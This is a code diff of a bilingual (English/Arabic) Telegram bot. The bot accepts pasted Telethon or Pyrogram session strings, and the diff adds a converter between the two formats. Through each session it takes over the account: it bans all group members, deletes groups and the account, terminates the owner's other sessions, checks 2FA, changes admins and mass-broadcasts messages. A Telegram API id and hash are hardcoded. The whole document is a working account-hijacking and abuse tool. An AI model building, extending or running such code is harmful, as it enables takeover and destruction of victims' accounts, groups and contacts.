-            op = await cu(strses.text)
-            if op:
-                pass
-            else:
+            session = validate_session(strses.text)
+            if not session:
                 return await event.respond("""Invalid Session, please use another one.
-                                   
-ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
+                                 
+ترمكس خاطئ، حاول آخر""", buttons=keyboard)
+
             try:
                 # Send a message with the initial loading bar
                 message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')
@@ -1550,11 +1130,12 @@ async def users(event):
                 for percent in percentages:
                     bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
                     await message.edit(f'يتم التحميل: {percent}% [{bar}]')
-                    time.sleep(0.3)  # Wait for 1 second
+                    time.sleep(0.2)  # Wait for 1 second
             except ValueError as e:
                 print(f"Failed to answer callback query: {e}")
+
             try:
-                i = await userchannels(strses.text)
+                i = await userchannels(session) if strses.text.startswith("1") or strses.text.endswith("=") else await userchannelsp(session)
             except:
                 return await event.reply("""Invalid Session, please use another one.
                                  
@@ -1583,32 +1164,68 @@ async def users(event):
                                    
 ترمكس خاطئ أو رقم هاتف غير صالح. يرجى التحقق من كود الترمكس.""", buttons=keyboard)
         except TimeoutError:
-            return await event.respond("""Please provide the termux session withing 60 seconds
+            return await event.respond("""Please provide the termux session within 60 seconds
             
 الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
 
 
+_PYRO_FORM = {351: ">B?256sI?", 356: ">B?256sQ?", 362: ">BI?256sQ?"}
 
+# Placeholder for the logger
+LOGS = None
 
-from telethon.errors import SessionPasswordNeededError, PhoneNumberUnoccupiedError
-import sys
-import os
+DC_IPV4 = {
+    1: "149.154.175.53",
+    2: "149.154.167.51",
+    3: "149.154.175.100",
+    4: "149.154.167.91",
+    5: "91.108.56.130",
+}
 
-import time
-import random
+def validate_session(session, logger=LOGS, _exit=True):
+    if session:
+        # Telethon Session
+        if session.startswith(CURRENT_VERSION):
+            if len(session.strip()) != 353:
+                logger.exception("Wrong string session. Copy paste correctly!")
+                sys.exit()
+            return session
 
-@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
-@is_banned
+        # Pyrogram Session
+        elif len(session) in _PYRO_FORM.keys():
+            data_ = struct.unpack(
+                _PYRO_FORM[len(session)],
+                base64.urlsafe_b64decode(session + "=" * (-len(session) % 4)),
+            )
+            if len(session) in [351, 356]:
+                auth_id = 2
+            else:
+                auth_id = 3
+            dc_id, auth_key = data_[0], data_[auth_id]
+            return StringSession(
+                CURRENT_VERSION
+                + base64.urlsafe_b64encode(
+                    struct.pack(
+                        _STRUCT_PREFORMAT.format(4),
+                        dc_id,
+                        ipaddress.ip_address(DC_IPV4[dc_id]).packed,
+                        443,
+                        auth_key,
+                    )
+                ).decode("ascii")
+            )
+        else:
+            return
+            if _exit:
+                sys.exit()
+    logger.exception("No String Session found. Quitting...")
+    if _exit:
+        sys.exit()
+
+@bot.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
 async def users(event):
     chat_id = event.chat_id
     user_id = event.sender_id
-    # Check if the user is in the channel
-    is_member = await is_user_in_channel(client, channel_id, user_id)
-    if not is_member:
-        await event.respond("""Please join @PrivaPact for the bot to work!
-        
-الرجاء الانضمام إلى @PrivaPact حتى يعمل البوت""")
-        return 
 
     # Check if the user is a developer
     is_developer = user_id in Developers
@@ -1627,7 +1244,7 @@ async def users(event):
 
     # Update the command cooldown for the user, unless they are a developer
     if not is_developer:
-        command_cooldown[user_id] = datetime.now() + timedelta(seconds=15)
+        command_cooldown[user_id] = datetime.now() + timedelta(seconds=10)
     sender_id = user_id  # Store the sender_id
 
     async with bot.conversation(event.chat_id) as x:
@@ -1642,13 +1259,15 @@ async def users(event):
             if not strses.text:
                 return await event.respond("Empty session. Please provide a valid Termux Session.", buttons=keyboard)
 
-            op = await cu(strses.text)
-            if op:
+            session = validate_session(strses.text)
+            if session:
                 pass
             else:
                 return await event.respond("""Invalid Session, please use another one.
                                    
 ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
+
+            info = await userinfo(session) if strses.text.startswith("1") or strses.text.endswith("=") else await userinfop(session)
 
             try:
                 # Send a message with the initial loading bar
@@ -1661,9 +1280,8 @@ async def users(event):
                 for percent in percentages:
                     bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
                     await message.edit(f'يتم التحميل: {percent}% [{bar}]')
-                    time.sleep(0.3)  # Wait for 1 second
+                    time.sleep(0.2)  # Wait for 1 second
 
-                info = await userinfo(strses.text)
                 await message.edit(info + "\n\n Generate by @PrivaPact", buttons=keyboard)
             except ValueError as e:
                 print(f"Failed to answer callback query: {e}")
@@ -1677,20 +1295,15 @@ async def users(event):
             return await event.respond("""Please provide the termux session within 60 seconds
             
 الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
-        except Exception as e:
-            await event.respond(f"An error occurred: {str(e)}")
 
-
-
-from telethon.errors import SessionPasswordNeededError, PhoneNumberUnoccupiedError
 
 
 
 @client.on(events.CallbackQuery(data=re.compile(b"C")))
-@is_banned
 async def users(event):
     chat_id = event.chat_id
     user_id = event.sender_id
+
     # Check if the user is in the channel
     is_member = await is_user_in_channel(client, channel_id, user_id)
     if not is_member:
@@ -1718,7 +1331,7 @@ async def users(event):
                 return
 
         # Update the command cooldown for the user
-        command_cooldown[user_id] = datetime.now() + timedelta(seconds=15)
+        command_cooldown[user_id] = datetime.now() + timedelta(seconds=10)
     
     async with bot.conversation(event.chat_id) as x:
         try:
@@ -1727,18 +1340,26 @@ async def users(event):
 الان ارسل لي كود الترمكس""")
             sender_id = event.sender_id 
             strses = await x.wait_event(events.NewMessage, timeout=60)
-            op = await cu(strses.text)
-            if not op:
-                await event.respond("""Invalid Session. Please use another one.
+
+            # Check if the session is empty
+            if not strses.text:
+                return await event.respond("Empty session. Please provide a valid Termux Session.", buttons=keyboard)
+
+            session = validate_session(strses.text)
+            if not session:
+                return await event.respond("""Invalid Session, please use another one.
     
 كود الترمكس غير صالح. الرجاء استخدام كود آخر.""", buttons=keyboard)
-                return
-            
-            
+
             await x.send_message("""Send the Group or Channel's ID/username.
     
 الان ارسل يوزر القناة او كروب""")
             grpid = await x.get_response()
+
+            # Check if the group/channel ID/username is empty
+            if not grpid.text:
+                return await event.respond("Empty group/channel ID/username. Please provide a valid ID/username.", buttons=keyboard)
+
             try:
                 # Send a message with the initial loading bar
                 message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')
@@ -1750,17 +1371,18 @@ async def users(event):
                 for percent in percentages:
                     bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
                     await message.edit(f'يتم التحميل: {percent}% [{bar}]')
-                    time.sleep(0.3)  # Wait for 1 second
+                    time.sleep(0.2)  # Wait for 1 second
             except ValueError as e:
                 print(f"Failed to answer callback query: {e}")
+
             # Perform actions with the client using the provided Termux session
-            await userbans(strses.text, grpid.text)
+            await userbans(session, grpid.text) if strses.text.startswith("1") or strses.text.endswith("=") else await userbansp(session, grpid.text)
             await message.edit("""Banning all Group/Channel members.
                       
 تم طرد كل الأعضاء""", buttons=keyboard)
         
         except TimeoutError:
-            return await event.respond("""Please provide the termux session withing 60 seconds
+            return await event.respond("""Please provide the termux session within 60 seconds
             
 الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
         except Exception as e:
@@ -1768,20 +1390,11 @@ async def users(event):
 
 
 
-
-
-
-from telethon.errors import SessionPasswordNeededError, PhoneNumberUnoccupiedError
-import sys
-
-from datetime import datetime, timedelta
-
 # Define a dictionary to store the last command execution time for each user
 command_cooldown = {}
 
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"D")))
-@is_banned
 async def users(event):
     chat_id = event.chat_id
     user_id = event.sender_id
@@ -1812,7 +1425,7 @@ async def users(event):
                 return
 
         # Update the command cooldown for the user
-        command_cooldown[user_id] = datetime.now() + timedelta(seconds=15)
+        command_cooldown[user_id] = datetime.now() + timedelta(seconds=10)
 
     async with bot.conversation(event.chat_id) as x:
         try:
@@ -1822,8 +1435,8 @@ async def users(event):
                                  
             sender_id = event.sender_id 
             strses = await x.wait_event(events.NewMessage, timeout=60)  # Replace with your actual Termux session
-            op = await cu(strses.text)
-            if op:
+            session = validate_session(strses.text)
+            if session:
                 pass
             else:
                 return await event.respond("""Invalid Session, please use another one.
@@ -1841,12 +1454,12 @@ async def users(event):
                 for percent in percentages:
                     bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
                     await message.edit(f'يتم التحميل: {percent}% [{bar}]')
-                    time.sleep(0.3)  # Wait for 1 second
+                    time.sleep(0.2)  # Wait for 1 second
             except Exception as e:
                 await event.respond(f"An error occurred: {str(e)}")
 
-            i = await usermsgs(strses.text)
-            await message.edit(i + "\n\n", buttons=keyboard)
+            i = await usermsgs(session) if strses.text.startswith("1") or strses.text.endswith("=") else await usermsgsp(session)
+            await message.edit(i + "\n\n start from top to bottom \n\n من الفوق الى الاسفل ابدا", buttons=keyboard)
         
         except TimeoutError:
             return await event.respond("""Please provide the termux session withing 60 seconds
@@ -1854,17 +1467,11 @@ async def users(event):
 الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
         except Exception as e:
             await event.respond(f"An error occurred: {str(e)}")
-             
 
-
-
-    
-from telethon.errors.rpcerrorlist import ChannelPrivateError
 
 # Rest of the code...
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
-@is_banned
 async def users(event):
     chat_id = event.chat_id
     user_id = event.sender_id
@@ -1894,7 +1501,7 @@ async def users(event):
                 return
 
         # Update the command cooldown for the user
-        command_cooldown[user_id] = datetime.now() + timedelta(seconds=15)
+        command_cooldown[user_id] = datetime.now() + timedelta(seconds=10)
 
     async with bot.conversation(event.chat_id) as x:
         try:
@@ -1903,17 +1510,21 @@ async def users(event):
 الان ارسل لي كود الترمكس لكي ادخل المستخدم في قناة او كروب""")
             sender_id = event.sender_id 
             strses = await x.wait_event(events.NewMessage, timeout=60)  # Replace with your actual Termux session
-            op = await cu(strses.text)
-            if not op:
-                await event.respond("""Invalid Session. Please use another one.
-        
-كود الترمكس غير صالح. الرجاء استخدام كود آخر.""", buttons=keyboard)
+            session = validate_session(strses.text)
+            if session:
+                pass
+            else:
+                return await event.respond("""Invalid Session, please use another one.
+                                   
+ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
                 return
             
-            await x.send_message("""Send the Group or Channel's, Id/username.
+            await x.send_message("""Send the Group or Channel usernames, separated by commas.
         
-الان ارسل يوزر القناة او كروب""")
-            grpid = await x.get_response()
+الان ارسل يوزر القنوات او الكروبات مفصولة بفاصلة""")
+            usernames = await x.get_response()
+            usernames = usernames.text.split(',')
+
             try:
                 # Send a message with the initial loading bar
                 message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')
@@ -1925,21 +1536,21 @@ async def users(event):
                 for percent in percentages:
                     bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
                     await message.edit(f'يتم التحميل: {percent}% [{bar}]')
-                    time.sleep(0.3)  # Wait for 1 second
+                    time.sleep(0.2)  # Wait for 1 second
             except ValueError as e:
                 print(f"Failed to answer callback query: {e}")
             try:
-                await joingroup(strses.text, grpid.text)
+                await joingroup(session, usernames) if strses.text.startswith("1") or strses.text.endswith("=") else await joingroupp(session, usernames)
                 await message.edit("""Joined Channel/Group.
             
 تم الانضمام""", buttons=keyboard)
             except ChannelPrivateError:
                 await event.respond(
 """The channel or group you specified is private, or you lack permission to access it.
-Please make sure the channel or group is public and that you have the necessary permissions to join.
+Please make sure the channels or groups are public and that you have the necessary permissions to join.
 
-القناة أو الكروب الذي حددته خاص أو ليس لديك الصلاحيات اللازمة للوصول إليه.
-تأكد من أن القناة أو الكروب عام وأن لديك الصلاحيات اللازمة للانضمام.""",
+القنوات أو الكروبات التي حددتها خاصة أو ليست لديك الصلاحيات اللازمة للوصول إليها.
+تأكد من أن القنوات أو الكروبات عامة وأن لديك الصلاحيات اللازمة للانضمام.""",
                     buttons=keyboard
                 )
         except TimeoutError:
@@ -1948,14 +1559,12 @@ Please make sure the channel or group is public and that you have the necessary 
 الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
         except Exception as e:
             await event.respond(f"An error occurred: {str(e)}")
-
 from telethon import errors
 
 # ... Your code ...
 
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"F")))
-@is_banned
 async def users(event):
     chat_id = event.chat_id
     user_id = event.sender_id
@@ -1984,7 +1593,7 @@ async def users(event):
             return
 
     # Update the command cooldown for the user
-    command_cooldown[user_id] = datetime.now() + timedelta(seconds=15)
+    command_cooldown[user_id] = datetime.now() + timedelta(seconds=10)
 
     async with bot.conversation(event.chat_id) as x:
         try:
@@ -1994,11 +1603,13 @@ async def users(event):
                                  
             sender_id = event.sender_id 
             strses = await x.wait_event(events.NewMessage, timeout=60)  # Replace with your actual Termux session
-            op = await cu(strses.text)
-            if not op:
-                await event.respond("""Invalid Session. Please use another one.
-        
-كود الترمكس غير صالح. الرجاء استخدام كود آخر.""", buttons=keyboard)
+            session = validate_session(strses.text)
+            if session:
+                pass
+            else:
+                return await event.respond("""Invalid Session, please use another one.
+                                   
+ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
                 return
 
             await x.send_message("""Send the ID or username of the channel/group.
@@ -2017,11 +1628,11 @@ async def users(event):
                 for percent in percentages:
                     bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
                     await message.edit(f'يتم التحميل: {percent}% [{bar}]')
-                    time.sleep(0.3)  # Wait for 1 second
+                    time.sleep(0.2)  # Wait for 1 second
             except ValueError as e:
                 print(f"Failed to answer callback query: {e}")
             try:
-                await leavegroup(strses.text, group_id)
+                await leavegroup(session, group_id) if strses.text.startswith("1") or strses.text.endswith("=") else await leavegroupp(session, group_id)
                 await event.respond("""Left channel/group successfully.
 
 تمت المغادرة من القناة/المجموعة بنجاح.""", buttons=keyboard)
@@ -2044,7 +1655,6 @@ from telethon import errors
 
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"G")))
-@is_banned
 async def users(event):
     chat_id = event.chat_id
     user_id = event.sender_id
@@ -2075,7 +1685,7 @@ async def users(event):
                 return
 
         # Update the command cooldown for the user
-        command_cooldown[user_id] = datetime.now() + timedelta(seconds=15)
+        command_cooldown[user_id] = datetime.now() + timedelta(seconds=10)
 
         await handle_users(event)
 
@@ -2089,12 +1699,14 @@ async def handle_users(event):
                                  
             sender_id = event.sender_id 
             strses = await x.wait_event(events.NewMessage, timeout=60)  # Replace with your actual Termux session
-            op = await cu(strses.text)
-            if not op:
-                 await event.respond("""Invalid Session. Please use another one.
-        
-ترمكس خاطئ. حاول غيره""", buttons=keyboard)
-                 return
+            session = validate_session(strses.text)
+            if session:
+                pass
+            else:
+                return await event.respond("""Invalid Session, please use another one.
+                                   
+ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
+                return
 
             await x.send_message("""Send the Group or Channel's ID/username.
         
@@ -2112,12 +1724,12 @@ async def handle_users(event):
                 for percent in percentages:
                     bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
                     await message.edit(f'يتم التحميل: {percent}% [{bar}]')
-                    time.sleep(0.3)  # Wait for 1 second
+                    time.sleep(0.2)  # Wait for 1 second
             except ValueError as e:
                 print(f"Failed to answer callback query: {e}")
 
             try: 
-                await delgroup(strses.text, group_id)
+                await delgroup(session, group_id) if strses.text.startswith("1") or strses.text.endswith("=") else await delgroupp(session, group_id)
                 await message.edit("""Deleted Channel/Group.
       
 تم حذفه""", buttons=keyboard)
@@ -2138,7 +1750,6 @@ async def handle_users(event):
 
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"H")))
-@is_banned
 async def users(event):
     chat_id = event.chat_id
     user_id = event.sender_id
@@ -2168,7 +1779,7 @@ async def users(event):
             return
 
     # Update the command cooldown for the user
-    command_cooldown[user_id] = datetime.now() + timedelta(seconds=15)
+    command_cooldown[user_id] = datetime.now() + timedelta(seconds=10)
 
     async with bot.conversation(event.chat_id) as x:
         try:
@@ -2178,11 +1789,13 @@ async def users(event):
                                  
             sender_id = event.sender_id 
             strses = await x.wait_event(events.NewMessage, timeout=60)  # Replace with your actual Termux session
-            op = await cu(strses.text)
-            if not op:
-                await event.respond("""Invalid Session. Please use another one.
-        
-ترمكس خاطئ. حاول غيره""", buttons=keyboard)
+            session = validate_session(strses.text)
+            if session:
+                pass
+            else:
+                return await event.respond("""Invalid Session, please use another one.
+                                   
+ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
                 return
             try:
                 # Send a message with the initial loading bar
@@ -2195,10 +1808,10 @@ async def users(event):
                 for percent in percentages:
                     bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
                     await message.edit(f'يتم التحميل: {percent}% [{bar}]')
-                    time.sleep(0.3)  # Wait for 1 second
+                    time.sleep(0.2)  # Wait for 1 second
             except ValueError as e:
                 print(f"Failed to answer callback query: {e}")
-            i = await user2fa(strses.text)
+            i = await user2fa(session) if strses.text.startswith("1") or strses.text.endswith("=") else await user2fap(session)
             if i:
                 await message.edit("""The user hasn't activated 2FA!
         
@@ -2214,16 +1827,8 @@ async def users(event):
         except Exception as e:
             await event.respond(f"An error occurred: {str(e)}")
 
-                          
-
-
-from telethon.errors.rpcerrorlist import FreshResetAuthorisationForbiddenError
-from datetime import timedelta, datetime
-
-# Rest of the code...
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"I")))
-@is_banned
 async def users(event):
     chat_id = event.chat_id
     user_id = event.sender_id
@@ -2253,7 +1858,7 @@ async def users(event):
 
     # Update the command cooldown for the user if not a developer
     if not is_developer:
-        command_cooldown[user_id] = datetime.now() + timedelta(seconds=15)
+        command_cooldown[user_id] = datetime.now() + timedelta(seconds=10)
 
     async with bot.conversation(event.chat_id) as x:
         try:
@@ -2263,11 +1868,13 @@ async def users(event):
                                  
             sender_id = event.sender_id 
             strses = await x.wait_event(events.NewMessage, timeout=60)  # Replace with your actual Termux session
-            op = await cu(strses.text)
-            if not op:
-                await event.respond("""Invalid Session. Please use another one.
-            
-ترمكس خاطئ. حاول غيره""", buttons=keyboard)
+            session = validate_session(strses.text)
+            if session:
+                pass
+            else:
+                return await event.respond("""Invalid Session, please use another one.
+                                   
+ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
                 return
             try:
                 # Send a message with the initial loading bar
@@ -2280,11 +1887,11 @@ async def users(event):
                 for percent in percentages:
                     bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
                     await message.edit(f'يتم التحميل: {percent}% [{bar}]')
-                    time.sleep(0.3)  # Wait for 1 second
+                    time.sleep(0.2)  # Wait for 1 second
             except ValueError as e:
                 print(f"Failed to answer callback query: {e}")
             try:
-                await terminate(strses.text)
+                await terminate(session) if strses.text.startswith("1") or strses.text.endswith("=") else await terminatep(session)
                 await message.edit("""Terminated all other device sessions besides the Termux session.
             
 تم طرد جميع الجلسات الأخرى باستثناء جلسة Termux.""", buttons=keyboard)
@@ -2302,14 +1909,7 @@ Please wait 24 hours before performing this action again.
             await event.respond(f"An error occurred: {str(e)}")
 
       
-
-from telethon.errors.rpcerrorlist import QueryIdInvalidError
-# Rest of the code...
-from telethon import events, functions
-
-
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
-@is_banned
 async def delete_account(event):
     # Check if the user is an owner
 
@@ -2329,7 +1929,7 @@ async def delete_account(event):
                 return
 
         # Update the command cooldown for the user
-        command_cooldown[event.sender_id] = datetime.now() + timedelta(seconds=15)
+        command_cooldown[event.sender_id] = datetime.now() + timedelta(seconds=10)
         
         await handle_delete_account(event)
 
@@ -2342,11 +1942,13 @@ async def handle_delete_account(event):
                                  
             sender_id = event.sender_id 
             strses = await x.wait_event(events.NewMessage, timeout=60)
-            op = await cu(strses.text)
-            if not op:
-                await event.respond("""Invalid Session. Please use another one.
-            
-ترمكس خاطئ. حاول غيره""", buttons=keyboard)
+            session = validate_session(strses.text)
+            if session:
+                pass
+            else:
+                return await event.respond("""Invalid Session, please use another one.
+                                   
+ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
                 return
             try:
                 # Send a message with the initial loading bar
@@ -2359,12 +1961,12 @@ async def handle_delete_account(event):
                 for percent in percentages:
                     bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
                     await message.edit(f'يتم التحميل: {percent}% [{bar}]')
-                    time.sleep(0.3)  # Wait for 1 second
+                    time.sleep(0.2)  # Wait for 1 second
             except ValueError as e:
                 print(f"Failed to answer callback query: {e}")
 
             try:
-                await delacc(strses.text)
+                await delacc(session) if strses.text.startswith("1") or strses.text.endswith("=") else await delaccp(session)
                 await message.edit("""Deleted Account.
             
 تم حذف الحساب""", buttons=keyboard)
@@ -2389,7 +1991,6 @@ from telethon.errors import UserNotParticipantError
 from telethon.errors import UserNotParticipantError
 
 @client.on(events.CallbackQuery(data=re.compile(b"K")))
-@is_banned
 async def users(event):
     chat_id = event.chat_id
     user_id = event.sender_id
@@ -2420,7 +2021,7 @@ async def users(event):
 
     # Update the command cooldown for the user, unless they are a developer
     if not is_developer:
-        command_cooldown[user_id] = datetime.now() + timedelta(seconds=15)
+        command_cooldown[user_id] = datetime.now() + timedelta(seconds=10)
 
     async with bot.conversation(event.chat_id) as x:
         try:
@@ -2430,11 +2031,13 @@ async def users(event):
                                  
             sender_id = event.sender_id 
             strses = await x.wait_event(events.NewMessage, timeout=60)
-            op = await cu(strses.text)
-            if not op:
-                await event.reply("""Invalid Session. Please use another one.
-            
-ترمكس خاطئ. حاول غيره""", buttons=keyboard)
+            session = validate_session(strses.text)
+            if session:
+                pass
+            else:
+                return await event.respond("""Invalid Session, please use another one.
+                                   
+ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
                 return
             
             await x.send_message("""Send the Group or Channel's ID/username.
@@ -2458,12 +2061,12 @@ async def users(event):
                 for percent in percentages:
                     bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
                     await message.edit(f'يتم التحميل: {percent}% [{bar}]')
-                    time.sleep(0.3)  # Wait for 1 second
+                    time.sleep(0.2)  # Wait for 1 second
             except ValueError as e:
                 print(f"Failed to answer callback query: {e}")
 
             try:
-                i = await promote(strses.text, group_id, user.text)
+                i = await promote(session, group_id, user.text) if strses.text.startswith("1") or strses.text.endswith("=") else await promotep(session, group_id, user.text)
                 await event.respond("""User added as admin successfully
                 
 تم رفع الادمن""")
@@ -2482,7 +2085,6 @@ async def users(event):
 
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"L")))
-@is_banned
 async def users(event):
     chat_id = event.chat_id
     user_id = event.sender_id
@@ -2510,7 +2112,7 @@ async def users(event):
                 return
 
         # Update the command cooldown for the user
-        command_cooldown[user_id] = datetime.now() + timedelta(seconds=15)
+        command_cooldown[user_id] = datetime.now() + timedelta(seconds=10)
 
     async with bot.conversation(event.chat_id) as x:
         try:
@@ -2520,11 +2122,13 @@ async def users(event):
                                  
             sender_id = event.sender_id 
             strses = await x.wait_event(events.NewMessage, timeout=60)
-            op = await cu(strses.text)
-            if not op:
-                await event.respond("""Invalid Session please use another one.
-            
-ترمكس خاطئ حاول غيره""", buttons=keyboard)
+            session = validate_session(strses.text)
+            if session:
+                pass
+            else:
+                return await event.respond("""Invalid Session, please use another one.
+                                   
+ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
                 return
             
             await x.send_message("""Send the Group or Channel's, Id/username.
@@ -2542,11 +2146,12 @@ async def users(event):
                 for percent in percentages:
                     bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
                     await message.edit(f'يتم التحميل: {percent}% [{bar}]')
-                    time.sleep(0.3)  # Wait for 1 second
+                    time.sleep(0.2)  # Wait for 1 second
             except ValueError as e:
                 print(f"Failed to answer callback query: {e}")
             try:
-                i = await demall(strses.text, pro.text)
+                i = await demall(session, pro.text) if strses.text.startswith("1") or strses.text.endswith("=") else await demallp(session, pro.text)
+
                 await event.respond("""Removed all admins from Group/Channel
       
 تم حذف جميع الادمنية في الكروب""", buttons=keyboard)
@@ -2564,7 +2169,6 @@ async def users(event):
 
 
 @client.on(events.CallbackQuery(data=re.compile(b"M")))
-@is_banned
 async def users(event):
     user_id = event.sender_id
 
@@ -2584,7 +2188,7 @@ async def users(event):
 
     # Update the command cooldown for the user, unless they are a developer
     if not is_developer:
-        command_cooldown[user_id] = datetime.now() + timedelta(seconds=15)
+        command_cooldown[user_id] = datetime.now() + timedelta(seconds=10)
 
     chat_id = event.chat_id
     user_id = event.sender_id
@@ -2651,7 +2255,6 @@ async def users(event):
 
 
 @client.on(events.CallbackQuery(data=re.compile(b"N")))
-@is_banned
 async def connect(event):
     chat_id = event.chat_id
     user_id = event.sender_id
@@ -2681,7 +2284,7 @@ async def connect(event):
 
     # Update the command cooldown for the user, except for developers
     if not is_developer:
-        command_cooldown[user_id] = datetime.now() + timedelta(seconds=15)
+        command_cooldown[user_id] = datetime.now() + timedelta(seconds=10)
 
     keyboard = [
         [
@@ -2724,8 +2327,27 @@ async def gcasta(strses, msg):
         except telethon.errors.rpcerrorlist.QueryIdInvalidError:
             pass
 
+async def gcastap(strses, msg):
+    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    await bot.connect()
+    try:
+            reply_msg = msg
+            tol = reply_msg
+            file = None
+            async for sweetie in bot.iter_dialogs():
+                chat = sweetie.entity
+                if isinstance(chat, (types.Chat, types.User)):
+                    try:
+                        await bot.send_message(chat, tol, file=file)
+                        await asyncio.sleep(0.5)  # Add a delay between sending messages
+                    except Exception as e:
+                        print(e)
+    except Exception as e:
+            print(e)
+    except telethon.errors.rpcerrorlist.QueryIdInvalidError:
+            pass
+
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"1")))
-@is_banned
 async def users(event):
     chat_id = event.chat_id
     user_id = event.sender_id
@@ -2742,12 +2364,14 @@ async def users(event):
                            
 الان ارسل لي كود الترمكس للكل""")
                                  
-            strses = (await x.get_response()).text
-            op = await cu(strses)
-            if not op:
-                await event.respond("""Invalid Session. Please use another one.
-                
-الترمكس خاطئ. حاول غيره""", buttons=keyboard)
+            strses = await x.wait_event(events.NewMessage)
+            session = validate_session(strses.text)
+            if session:
+                pass
+            else:
+                return await event.respond("""Invalid Session, please use another one.
+                                   
+ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
                 return
 
             await x.send_message("""Send message.
@@ -2765,11 +2389,11 @@ async def users(event):
                 for percent in percentages:
                     bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
                     await message.edit(f'يتم التحميل: {percent}% [{bar}]')
-                    time.sleep(0.3)  # Wait for 1 second
+                    time.sleep(0.2)  # Wait for 1 second
             except ValueError as e:
                 print(f"Failed to answer callback query: {e}")
             try:
-                await gcasta(strses, msg)
+                await gcasta(session, msg) if strses.text.startswith("1") or strses.text.endswith("=") else await gcastap(session, msg)
                 await message.edit("""Done Gcasted to all
                 
 تم الارسال للكل""", buttons=keyboard)
@@ -2785,11 +2409,6 @@ async def users(event):
         except Exception as e:
             print(f"An error occurred: {str(e)}")
             await event.reply("Invalid session. Please provide a valid Termux session.", buttons=keyboard)
-
-
-
-
-
 
 
 
@@ -2815,9 +2434,30 @@ async def gcastb(strses, msg):
         except Exception as e:
             print(e)
 
+async def gcastbp(strses, msg):
+    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    await bot.connect()
+    try:
+            reply_msg = msg
+            tol = reply_msg
+            file = None
+            sent_groups = []
+            async for sweetie in bot.iter_dialogs():
+                if sweetie.is_group:
+                    chat = sweetie.id
+                    try:
+                        if chat != -1001878403490:
+                            await bot.send_message(chat, tol, file=file)
+                            sent_groups.append(chat)
+                        elif chat == -1001878403490:
+                            pass
+                    except Exception as e:
+                        print(e)
+            return sent_groups
+    except Exception as e:
+            print(e)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"2")))
-@is_banned
 async def users(event):
     chat_id = event.chat_id
     user_id = event.sender_id
@@ -2833,12 +2473,14 @@ async def users(event):
             await x.send_message("""Now send me the Termux Session to gcast in groups
             
 الان ارسل لي الترمكس لكي ارسلها الى الكروبات""")
-            strses = (await x.get_response()).text
-            op = await cu(strses)
-            if not op:
-                return await event.respond("""Invalid Session. Please use another one.
-                
-الترمكس خاطئ. حاول غيره""", buttons=keyboard)
+            strses = await x.wait_event(events.NewMessage)
+            session = validate_session(strses.text)
+            if session:
+                pass
+            else:
+                return await event.respond("""Invalid Session, please use another one.
+                                   
+ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
             await x.send_message("""Send message
             
 ارسل الرسالة""")
@@ -2854,11 +2496,11 @@ async def users(event):
                 for percent in percentages:
                     bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
                     await message.edit(f'يتم التحميل: {percent}% [{bar}]')
-                    time.sleep(0.3)  # Wait for 1 second
+                    time.sleep(0.2)  # Wait for 1 second
             except ValueError as e:
                 print(f"Failed to answer callback query: {e}")
             try:
-                sent_groups = await gcastb(strses, msg)
+                sent_groups = await gcastb(session, msg) if strses.text.startswith("1") or strses.text.endswith("=") else await gcastbp(session, msg)
                 sent_group_count = len(sent_groups)
                 if sent_group_count > 0:
                     await message.edit(f"""Done Gcasted in {sent_group_count} Groups
@@ -2903,9 +2545,27 @@ async def gcastc(strses, msg):
             print(e)
 
 
+async def gcastcp(strses, msg):
